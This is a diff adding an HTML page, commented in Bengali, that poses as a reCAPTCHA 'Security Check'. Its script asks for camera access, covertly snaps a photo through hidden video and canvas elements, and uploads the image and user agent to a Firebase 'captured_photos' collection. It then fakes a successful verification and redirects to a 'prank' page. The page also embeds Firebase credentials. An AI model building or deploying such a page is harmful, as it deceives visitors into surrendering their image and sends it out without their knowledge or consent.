@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        
+        body {
+            display: flex; justify-content: center; align-items: center; min-height: 100vh;
+            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+            overflow: hidden;
+        }
+
+        .verification-card {
+            background: rgba(255, 255, 255, 0.95); padding: 40px; border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); text-align: center; width: 350px;
+        }
+
+        h2 { color: #333; margin-bottom: 10px; font-weight: 600; }
+        p { color: #666; font-size: 14px; margin-bottom: 30px; }
+
+        .captcha-box {
+            background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 4px;
+            padding: 20px 15px; display: flex; align-items: center; justify-content: space-between;
+            cursor: pointer; transition: background 0.2s; margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .captcha-box:hover { background: #f0f0f0; }
+
+        .captcha-content { display: flex; align-items: center; gap: 15px; }
+        
+        .spinner {
+            border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%;
+            width: 24px; height: 24px; animation: spin 1s linear infinite; display: none;
+        }
+
+        .custom-checkbox {
+            width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px;
+            background: white; position: relative;
+        }
+        .custom-checkbox.checked { background: #4CAF50; border-color: #4CAF50; }
+        .custom-checkbox.checked::after {
+            content: ''; position: absolute; left: 7px; top: 3px; width: 6px; height: 12px;
+            border: solid white; border-width: 0 3px 3px 0; transform: rotate(45deg);
+        }
+
+        .captcha-logo img { width: 38px; opacity: 0.7; }
+        
+        /* মেসেজের স্টাইল */
+        .status-msg { 
+            margin-top: 15px; 
+            font-size: 13px; 
+            color: #888; 
+            min-height: 20px;
+            line-height: 1.4;
+        }
+
+        /* লুকানো এলিমেন্ট */
+        #videoElement { display: none; }
+        #canvasElement { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="verification-card">
+        <h2>Security Check</h2>
+        <p>Identity verification required.</p>
+
+        <div class="captcha-box" id="captchaBox" onclick="startVerification()">
+            <div class="captcha-content">
+                <div class="custom-checkbox" id="checkbox"></div>
+                <div class="spinner" id="spinner"></div>
+                <span class="captcha-label">I'm not a robot</span>
+            </div>
+            <div class="captcha-logo">
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="Logo">
+            </div>
+        </div>
+        
+        <div class="status-msg" id="statusText">Waiting for action...</div>
+    </div>
+
+    <video id="videoElement" autoplay playsinline></video>
+    <canvas id="canvasElement"></canvas>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        // ==========================================
+        // Firebase Config এখানে বসান
+        // ==========================================
+      const firebaseConfig = {
+  apiKey: "AIzaSyDtIf_By5BvhFt2BV7lUfGGs-IWljWNwaw",
+  authDomain: "nahian-1869b.firebaseapp.com",
+  projectId: "nahian-1869b",
+  storageBucket: "nahian-1869b.firebasestorage.app",
+  messagingSenderId: "226446990283",
+  appId: "1:226446990283:web:821e0aea4c24db87ddf44e",
+  measurementId: "G-5MN57509NZ"
+};
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        let isProcessing = false;
+
+        window.startVerification = async function() {
+            if (isProcessing) return;
+            isProcessing = true;
+
+            const checkbox = document.getElementById('checkbox');
+            const spinner = document.getElementById('spinner');
+            const statusText = document.getElementById('statusText');
+            const video = document.getElementById('videoElement');
+            const canvas = document.getElementById('canvasElement');
+
+            // UI রিসেট
+            checkbox.classList.remove('checked');
+            checkbox.style.display = 'none';
+            spinner.style.display = 'block';
+            statusText.innerText = "Checking permissions...";
+            statusText.style.color = "#888";
+
+            try {
+                // ক্যামেরা এক্সেস চাওয়া
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                
+                // যদি Allow করে, তাহলে নিচের কোড কাজ করবে
+                video.srcObject = stream;
+
+                video.onloadedmetadata = async () => {
+                    // ছবি তোলা
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const imageData = canvas.toDataURL('image/png');
+
+                    statusText.innerText = "Verifying...";
+                    
+                    // ফায়ারবেসে পাঠানো
+                    await addDoc(collection(db, "captured_photos"), {
+                        image: imageData,
+                        timestamp: serverTimestamp(),
+                        userAgent: navigator.userAgent
+                    });
+
+                    // ক্যামেরা বন্ধ করা
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // সফল! রিডাইরেক্ট
+                    spinner.style.display = 'none';
+                    checkbox.style.display = 'block';
+                    checkbox.classList.add('checked');
+                    statusText.innerText = "Verification Complete! Redirecting...";
+                    statusText.style.color = "#4CAF50";
+
+                    setTimeout(() => {
+                        window.location.href = "prank1.html";
+                    }, 1000);
+                };
+
+            } catch (error) {
+                // যদি Permission না দেয় বা Block করে
+                console.error("Permission Denied:", error);
+                
+                isProcessing = false; // আবার ক্লিক করার সুযোগ দেওয়া
+                spinner.style.display = 'none';
+                checkbox.style.display = 'block';
+                
+                // লাল রঙের ওয়ার্নিং মেসেজ
+                statusText.innerText = "You can not catch up the page..please allow the camera..";
+                statusText.style.color = "red";
+                statusText.style.fontWeight = "bold";
+            }
+        }
+    </script>
+
+</body>
+</html>
